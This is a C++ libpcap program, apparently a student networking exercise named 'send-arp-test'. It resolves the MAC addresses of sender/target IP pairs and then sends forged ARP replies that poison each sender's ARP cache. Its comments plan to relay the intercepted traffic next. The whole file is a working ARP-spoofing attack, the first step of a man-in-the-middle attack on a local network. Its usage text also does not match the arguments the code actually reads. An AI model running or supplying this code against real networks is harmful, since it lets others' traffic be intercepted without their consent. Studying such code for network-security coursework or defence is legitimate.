#include "ethhdr.h"
#include "arphdr.h"
#include "arputils.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

int main(int argc, char* argv[]) {
    map<string, string> IP_MAC;

    if (argc < 4 ) {
        usage();
        return -1;
    }

    uint8_t inface_mac[6];
    uint8_t interface_ip[4];

    char my_mac[18];
    char my_ip[16];
    char* dev = argv[1];

    get_MAC_IP_Address(dev, inface_mac, interface_ip);

    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
            inface_mac[0], inface_mac[1], inface_mac[2],
            inface_mac[3], inface_mac[4], inface_mac[5]);
    sprintf(my_ip, "%d.%d.%d.%d",
            interface_ip[0], interface_ip[1], interface_ip[2], interface_ip[3]);


    cout << "----my address----" << endl;
    printf("my mac : %s\n",my_mac);
    printf("my ip : %s\n", my_ip);
    int cnt = ( argc -2 ) / 2;
    cout << "------------------" << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    char sender_mac[18];
    char sender_ip[15];
    char target_mac[18];
    char target_ip[15];

    string tmp_ip;
    string tmp_mac;

    for(int i = 0 ; i < cnt ; i++ ){
        strcpy(sender_ip, argv[2+(i*2)]);
        strcpy(target_ip, argv[3+(i*2)]);

        cout << endl << "----Ip_info----" << endl;
        cout << "sender_ip : " << sender_ip << endl;
        cout << "target_ip : " << target_ip << endl;
        cout << "---------------" << endl;

        tmp_ip = sender_ip;
        if (IP_MAC.count(tmp_ip)) {
            strcpy(sender_mac,IP_MAC[sender_ip].c_str());
        }else{
            get_mac_address(handle, my_mac, my_ip, sender_ip,sender_mac);
            tmp_mac = sender_mac;
            IP_MAC.insert({tmp_ip, tmp_mac});
        }

        tmp_ip = target_ip;
        if (IP_MAC.count(tmp_ip)) {
            strcpy(target_mac, IP_MAC[tmp_ip].c_str());
        }else{
            get_mac_address(handle, my_mac, my_ip, target_ip,target_mac);
            tmp_mac = target_mac;
            IP_MAC.insert({tmp_ip, tmp_mac});
        }

        formatMacAddress(sender_mac);
        formatMacAddress(target_mac);

        cout << endl << "-------attack_" << i+1 << "--------" << endl;
        printf("sender mac : %s\n", sender_mac);
        printf("sender ip : %s\n",sender_ip);
        printf("target mac : %s\n", target_mac);
        printf("target ip : %s\n",target_ip);

        send_attack_ARP(handle,  my_mac, sender_mac , target_ip, sender_ip);
        cout << "---attack finished---" << endl;

        //받은 데이터들을 바탕으로 전부 공격 패킷 날려 놓기

        /*
        여기부터는 계속 반복문 돌리면서 받는 패킷들을 전부 dst ip를 구분하여 mac주소를 수정해준뒤 전송
        */
    }

    cout << endl << endl << "------print map-------" << endl;
    for (const auto& pair : IP_MAC) {
        std::cout << "Key: " << pair.first << ", Value: " << pair.second << std::endl;
    }
    cout << "----------------------" << endl;

    pcap_close(handle);
    return 0;
}


void usage() {
    printf("syntax: send-arp-test <interface> <target-ip>\n");
    printf("sample: send-arp-test wlan0 192.168.0.1\n");
}

void formatMacAddress(char* mac) {
    char segments[6][3] = {0};
    int segmentIndex = 0;
    const char* token = mac;
    char formattedMac[18];
    char segment[3];

    while (*token) {
        int length = 0;

        while (*token && *token != ':' && length < 2) {
            segment[length++] = *token++;
        }
        segment[length] = '\0';

        if (length == 1) {
            segments[segmentIndex][0] = '0';
            segments[segmentIndex][1] = segment[0];
        } else {
            strcpy(segments[segmentIndex], segment);
        }

        segmentIndex++;
        if (*token == ':') {
            token++;
        }
    }
    snprintf(formattedMac, 18, "%s:%s:%s:%s:%s:%s",
             segments[0], segments[1], segments[2],
             segments[3], segments[4], segments[5]);
    memcpy(mac, formattedMac , 18);
}

void get_MAC_IP_Address(const char *iface, uint8_t *mac, uint8_t *ip) {
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    memcpy(ip, &ipaddr->sin_addr.s_addr, sizeof(ipaddr->sin_addr.s_addr));

    close(fd);
}

void get_mac_address(pcap_t *handle,char *my_mac, char*my_ip, char* sender_ip, char* mac){

    EthArpPacket to_send_packet;

    to_send_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    to_send_packet.eth_.smac_ = Mac(my_mac);
    to_send_packet.eth_.type_ = htons(EthHdr::Arp);

    to_send_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    to_send_packet.arp_.pro_ = htons(EthHdr::Ip4);
    to_send_packet.arp_.hln_ = Mac::SIZE;
    to_send_packet.arp_.pln_ = Ip::SIZE;
    to_send_packet.arp_.op_ = htons(ArpHdr::Request);
    to_send_packet.arp_.smac_ = Mac(my_mac);
    to_send_packet.arp_.sip_ = htonl(Ip(my_ip));
    to_send_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    to_send_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_send_packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    char sender_mac[18];
    struct pcap_pkthdr* header;
    const u_char* reply_packet;

    while (true) {
        int ret = pcap_next_ex(handle, &header, &reply_packet);
        if (ret == 1) {
            EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
            if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
                Ip(sender_ip) == reply->arp_.sip()){
                ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, sender_mac);
                break;
            }
        }
    }
    memcpy(mac,sender_mac,18);
}

void send_attack_ARP(pcap_t* handle, char* my_mac, char* sender_mac , char* target_ip, char* sender_ip){
    EthArpPacket attack_packet;

    attack_packet.eth_.dmac_ = Mac(sender_mac);
    attack_packet.eth_.smac_ = Mac(my_mac);
    attack_packet.eth_.type_ = htons(EthHdr::Arp);

    attack_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    attack_packet.arp_.pro_ = htons(EthHdr::Ip4);
    attack_packet.arp_.hln_ = Mac::SIZE;
    attack_packet.arp_.pln_ = Ip::SIZE;
    attack_packet.arp_.op_ = htons(ArpHdr::Reply);
    attack_packet.arp_.smac_ = Mac(my_mac);
    attack_packet.arp_.sip_ = htonl(Ip(target_ip));
    attack_packet.arp_.tmac_ = Mac(sender_mac);
    attack_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
    if (res2 != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
    }
}
